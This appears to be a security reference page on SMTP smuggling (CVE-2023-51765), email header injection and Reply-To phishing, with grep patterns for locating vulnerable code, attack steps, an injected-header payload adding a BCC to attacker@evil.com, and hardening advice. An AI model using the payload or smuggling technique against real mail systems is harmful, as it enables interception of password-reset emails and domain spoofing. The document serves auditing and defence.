# SMTP Smuggling & Email Infrastructure Spoofing

> **Context:** Email spoofing is a classic attack, but SMTP Smuggling (CVE-2023-51765) introduced a new class of vulnerabilities where attackers exploit discrepancies in how inbound and outbound SMTP servers handle end-of-data sequences (`<CR><LF>.<CR><LF>`).

**Tags:** #high #email #spoofing #smtp #infrastructure
**CVSS Base:** 7.5 (High)

---

## 📖 What it is

SMTP Smuggling occurs when two SMTP servers (e.g., an outbound relay and an inbound receiver) have different interpretations of where an email message ends. If an attacker can inject an alternative end-of-data sequence (like `\n.\n` or `\r.\r`) that the sending server ignores but the receiving server respects, they can "smuggle" a second, entirely spoofed email inside the body of the first.

This completely bypasses SPF, DKIM, and DMARC because the smuggled email inherits the authentication of the first (legitimate) email.

---

## 🔍 `grep_search` Tactics

```
nodemailer
smtplib
sendmail
endOfData
'\n.\n'
\r\n.\r\n
dkim
```

---

## 💣 Attack Category 1: SMTP Smuggling (End-of-Data Desync)

**How it works:**
1. The attacker connects to a vulnerable outbound server (e.g., a shared hosting provider).
2. They send a legitimate email body, but inject an alternative end-of-data sequence (e.g., `\n.\n`) followed by a completely new SMTP `MAIL FROM:` and `DATA` block.
3. The outbound server ignores the `\n.\n`, treating the smuggled payload as part of the message body. It signs the entire block with a valid DKIM signature.
4. The inbound server receives the message. It *does* interpret `\n.\n` as the end of the first email. It then parses the smuggled payload as a *second* email.
5. The second email appears to come from a highly trusted domain (e.g., `admin@microsoft.com`) and passes SPF/DMARC because it was delivered over the same trusted connection.

**Vulnerable Scenarios:**
- Web applications that allow users to send emails with custom bodies (e.g., "Contact Us" forms, "Share this article" features).
- If the application's email library (like `nodemailer` or PHP's `mail()`) does not sanitize bare LFs (`\n`) or bare CRs (`\r`) in the message body.

**`grep_search`:** `transporter.sendMail({`, `mail(`, `Message.setBody(`.

---

## 💣 Attack Category 2: Header Injection (BCC Spoofing)

**How it works:** Similar to HTTP Header Injection, if an application takes user input and places it directly into the email subject or "To" field without sanitizing CRLF (`\r\n`), the attacker can inject additional email headers.

**Attack Payload:**
```
To: victim@example.com\r\nBcc: attacker@evil.com\r\nSubject: Password Reset
```

**Impact:** The attacker receives a blind carbon copy of sensitive emails (e.g., password reset links) intended for the victim.

---

## 💣 Attack Category 3: Reply-To vs From Discrepancy (Phishing)

**How it works:** The application sends automated emails (like invoices) but allows the user to set the `Reply-To` or `From` name.
**Attack:** An attacker uses the application's legitimate mailing infrastructure to send phishing emails. The email comes from `billing@trusted-app.com` (passing DMARC), but the `Reply-To` is set to `attacker@evil.com`. When the victim replies with sensitive info, it goes to the attacker.

---

## 🛡️ Fix & Hardening

1. **Strict CRLF Sanitization:** Ensure the email library strict-filters or encodes bare `\n` and `\r`. Only `\r\n` should be used for line breaks, and `\r\n.\r\n` must be heavily sanitized if provided by the user.
2. **Library Updates:** Ensure `nodemailer`, `smtplib`, and the underlying MTA (Postfix, Exim) are updated to versions released after December 2023 (post-SMTP Smuggling patches).
3. **No User-Controlled Headers:** Never allow user input to directly populate `To`, `Cc`, `Bcc`, or `Subject` without strict allow-listing or encoding.

---

## 🔗 Chain Exploits

```
Email Form CRLF Injection ➔ BCC Password Reset Theft ➔ Full Account Takeover
SMTP Smuggling ➔ Trusted Domain Phishing (Bypass DMARC/SPF) ➔ Corporate Breach
```

---
*Tags: #email-security #smtp-smuggling #header-injection #phishing #shiva-vault*
